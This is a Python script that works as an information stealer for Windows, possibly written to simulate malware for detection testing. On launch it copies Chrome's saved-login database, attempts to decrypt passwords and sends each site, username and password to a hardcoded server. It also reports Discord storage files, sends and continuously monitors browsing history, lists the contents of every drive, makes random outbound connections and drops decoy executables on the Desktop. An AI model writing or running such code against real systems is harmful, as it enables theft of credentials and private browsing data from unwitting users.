import os
import sqlite3
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import shutil
import time
from datetime import datetime, timedelta
import threading
import socket
import sys
import random  # Import random for random delays
import string
import subprocess

def send_to_server(data, host='192.168.1.223', port=12345):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        client_socket.sendall(data.encode('utf-8'))  # Encode data and send to server
        client_socket.close()
    except Exception as e:
        # Raise an exception if sending fails
        raise RuntimeError(f"Error sending data: {e}")

def random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def create_random_file(folder_path):
    # Generate a random filename (random string of length 8)
    file_name = random_string(8)

    # Suspicious file extensions
    extensions = ['.dll', '.exe', '.bat', '.tmp']

    # Pick a random extension
    file_extension = random.choice(extensions)

    # Create a full file path with the random name and extension
    file_path = os.path.join(folder_path, f"{file_name}{file_extension}")

    # Generate random content for the file (random words)
    content = ' '.join(random_string(random.randint(4, 8)) for _ in range(10))

    # Write the random content to the file
    with open(file_path, 'w') as f:
        f.write(content)

    print(f"[INFO] Created file: {file_path}")

# Function to decrypt password using AES-GCM
def decrypt_password(encrypted_password):
    try:
        # Strip the 'v10' prefix if it exists
        if encrypted_password[:3] == b'v10':
            encrypted_password = encrypted_password[3:]

        # Extract IV, ciphertext, and authentication tag
        iv = encrypted_password[:12]  # 12-byte Initialization Vector
        ciphertext = encrypted_password[12:-16]  # Ciphertext (without the last 16 bytes)
        tag = encrypted_password[-16:]  # 16-byte Authentication Tag

        # Fetch the decryption key from Windows DPAPI (for now, use a placeholder key)
        key = b'sixteen byte key'  # This is a placeholder. Fetch the real DPAPI key in production.

        # AES-GCM decryption
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()

        return decrypted_password.decode('utf-8')
    except Exception as e:
        return f"Error decrypting password: {e}"

# Function to extract login data from Chrome's "Login Data" SQLite file and decrypt the passwords
def extract_and_decrypt_logins():
    # Get the current user's home directory
    home_directory = os.path.expanduser('~')

    # Path to the Login Data file
    file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

    # Make a copy of the Login Data file to avoid locks
    copy_file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data.bak.dll')

    try:
        shutil.copy2(file_path, copy_file_path)
    except Exception as e:
        return

    # Connect to the copied Login Data database and extract credentials
    if os.path.isfile(copy_file_path):
        try:
            # Connect to the copied SQLite database
            conn = sqlite3.connect(copy_file_path)
            cursor = conn.cursor()

            # Query to extract login data
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            # Fetch all results
            rows = cursor.fetchall()

            # Display the results with decrypted passwords
            for row in rows:
                # Encrypted password
                encrypted_password = row[2]

                # Decrypt the password
                decrypted_password = decrypt_password(encrypted_password)

                output = (f"Website: {row[0]}, Username: {row[1]}, Password: {decrypted_password}")
                send_to_server(output)

            conn.close()
        except sqlite3.Error as e:
            print(f"[ERROR] SQLite error: {e}")
    else:
        print(f"[WARNING] Login Data copy not found.")

def get_discord_data(ip):
    home_directory = os.path.expanduser('~')

    # Path to the Discord data folder
    discord_path = os.path.join(home_directory, 'AppData', 'Roaming', 'discord', 'Local Storage', 'leveldb')

    if os.path.exists(discord_path):
        try:
            files = os.listdir(discord_path)

            # List the files in the Discord directory
            for file in files:
                file_path = os.path.join(discord_path, file)
                message = ("Found discord file at: "+file_path)
                send_to_server(message, host=ip, port=12345)
                time.sleep(random.uniform(0.5, 2.0))
        except Exception as e:
            print(f"Error accessing Discord data: {e}")
    else:
        print(f"Discord data directory not found at: {discord_path}")

def google_history(ip):
    home_directory = os.path.expanduser('~')

    # Path to the original Chrome History file
    history_file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')

    # Path to the copied History file
    copy_file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'HistoryCopy.tmp.exe')

    try:
        # Make a copy of the History file to avoid database lock issues
        shutil.copy2(history_file_path, copy_file_path)

        # Connect to the copied SQLite database
        conn = sqlite3.connect(copy_file_path)
        cursor = conn.cursor()

        # Get the current date and time
        now = datetime.now()

        # Calculate the time 24 hours ago
        target_date = now - timedelta(days=0.2)

        # Chrome timestamp epoch starts at 1601-01-01
        chrome_epoch_start = datetime(1601, 1, 1)
        # Calculate the microseconds difference from the 1601 epoch to the target date (24 hours ago)
        target_date_epoch = int((target_date - chrome_epoch_start).total_seconds() * 1_000_000)

        # Query to extract URLs from the last 24 hours
        cursor.execute("""
            SELECT url, title, last_visit_time
            FROM urls
            WHERE last_visit_time > ?
        """, (target_date_epoch,))

        # Fetch all results
        rows = cursor.fetchall()

        # Loop through each row and send it to the server individually
        for row in rows:
            url = row[0]
            title = row[1]
            last_visit_time = row[2]

            # Convert Chrome timestamp to human-readable format
            visit_time = chrome_epoch_start + timedelta(microseconds=last_visit_time)

            # Truncate the URL to 50 characters if it's too long
            if len(url) > 50:
                url = url[:50] + '...'  # Add ellipsis to indicate truncation

            # Prepare the message to send
            output = f"Visited URL: {url}\nTitle: {title}\nVisited On: {visit_time}\n{'-' * 50}\n"

            # Send each individual result to the server
            send_to_server(output, host=ip, port=12345)
            time.sleep(random.uniform(0.5, 2.0))

        conn.close()
    except sqlite3.Error as e:
        print(f"An error occurred while retrieving Google history: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Clean up: Remove the copied History file after processing
        if os.path.exists(copy_file_path):
            os.remove(copy_file_path)

# Function to monitor for new browsing history in Google Chrome
def monitor_history():
    print("Monitoring history\n")
    home_directory = os.path.expanduser('~')

    # Path to the original Chrome History file
    history_file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')

    # Path to the copied History file
    copy_file_path = os.path.join(home_directory, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History Copy Monitor')

    # Get current time in Chrome's epoch format
    chrome_epoch_start = datetime(1601, 1, 1)
    last_visit_time_epoch = int((datetime.now() - chrome_epoch_start).total_seconds() * 1_000_000)  # Current time in Chrome's format

    while True:
        print(f"Copying history file to: {copy_file_path}")
        try:
            # Make a copy of the History file to avoid database lock issues
            shutil.copy2(history_file_path, copy_file_path)

            # Connect to the copied SQLite database
            conn = sqlite3.connect(copy_file_path)
            cursor = conn.cursor()

            # Query to get any new URLs since the last visit time
            cursor.execute("""
                SELECT url, title, last_visit_time
                FROM urls
                WHERE last_visit_time > ?
            """, (last_visit_time_epoch,))

            # Fetch new entries
            new_rows = cursor.fetchall()
            print(f"Found {len(new_rows)} new rows.")

            if new_rows:
                for row in new_rows:
                    url = row[0]
                    title = row[1]
                    last_visit_time = row[2]

                    # Update the last visit time to track the most recent entry
                    last_visit_time_epoch = max(last_visit_time_epoch, last_visit_time)

                    # Convert Chrome timestamp to human-readable format
                    visit_time = chrome_epoch_start + timedelta(microseconds=last_visit_time)

                    # Truncate the URL to 50 characters if it's too long
                    if len(url) > 50:
                        url = url[:50] + '...'  # Add ellipsis to indicate truncation

                    # Prepare the message to send
                    output = f"Visited URL: {url}\nTitle: {title}\nVisited On: {visit_time}\n{'-' * 50}\n"

                    # Send each individual result to the server
                    send_to_server(output, host='192.168.1.223', port=12345)
                    time.sleep(random.uniform(0.5, 2.0))

            conn.close()

            # Remove the copied file after monitoring
            if os.path.exists(copy_file_path):
                os.remove(copy_file_path)

        except sqlite3.Error as e:
            print(f"An error occurred while monitoring Google history: {e}")
        except Exception as e:
            print(f"Error: {e}")

        # Sleep for a while before checking again (e.g., every 10 seconds)
        time.sleep(10)  # Adjust this interval as needed

def list_contents(path, host, port):
    content_message = ""  # Initialize an empty string to accumulate messages
    try:
        # List all items in the provided path
        items = os.listdir(path)
        content_message += f"Contents of '{path}':\n"

        if not items:
            content_message += "  (No items found)\n"
        else:
            for item in items:
                item_path = os.path.join(path, item)
                if os.path.isdir(item_path):  # If it's a directory
                    content_message += f"Folder: {item}\n"
                    # Recursively list contents of this folder
                    content_message += list_contents(item_path, host, port)
                else:  # If it's a file
                    content_message += f"File: {item}\n"

        # Send the accumulated message to the server
        send_to_server(content_message, host, port)

    except Exception as e:
        error_message = f"Error accessing {path}: {e}\n"
        send_to_server(error_message, host, port)

    return content_message  # Return the accumulated message

def list_desktop_and_pc_contents(host, port):
    # Get the path to the Desktop
    home_directory = os.path.expanduser('~')
    desktop_path = os.path.join(home_directory, 'Desktop')

    # List contents on the Desktop
    list_contents(desktop_path, host, port)

    # List contents in "This PC"
    drives = [f"{d}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]

    for drive in drives:
        list_contents(drive, host, port)

def process_injection():
    try:
        while True:
            subprocess.Popen('notepad.exe')
            time.sleep(60)  # Wait for the process to start

            # Inject into the process (we won't actually inject, just simulate the attempt)
            print(f"[INFO] Attempted process injection into Notepad")
    except Exception as e:
        print(f"[ERROR] Process injection failed: {e}")

def suspicious_network_activity():
    while True:
        try:
             # Random IP addresses and ports to simulate connection attempts
            ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            port = random.randint(1024, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_address, port))
            sock.close()
            print(f"[INFO] Connected to {ip_address}:{port}")
        except Exception as e:
            print(f"[ERROR] Network activity failed: {e}")

def create_folder_and_files():
    # Get the user's Desktop path
    home_directory = os.path.expanduser('~')
    desktop_path = os.path.join(home_directory, 'Desktop')

    # Create a folder called 'Suspicious_Files' on the Desktop
    folder_path = os.path.join(desktop_path, 'Suspicious_Files')

    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"[INFO] Created folder: {folder_path}")
    else:
        print(f"[INFO] Folder already exists: {folder_path}")

    # Continuously create random files every 1 minute
    while True:
        create_random_file(folder_path)
        time.sleep(30)  # Wait for 1 minute before creating the next file

def main():
    ip = '192.168.1.223'
    try:
        folder_thread = threading.Thread(target=create_folder_and_files)
        monitor_thread = threading.Thread(target=monitor_history)
        network_thread = threading.Thread(target=suspicious_network_activity)
        process_thread = threading.Thread(target=process_injection)

        folder_thread.start()
        monitor_thread.start()
        network_thread.start()
        process_thread.start()

        extract_and_decrypt_logins()
        get_discord_data(ip)
        google_history(ip)
        list_desktop_and_pc_contents(ip, 12345)

        # Wait for the monitoring thread to finish (optional)
        #monitor_thread.join()

    except RuntimeError as e:
        print(e)
        print("Shutting down client due to server disconnection.")
        sys.exit(1)  # Exit with a non-zero status to indicate an error

# Run the main function
main()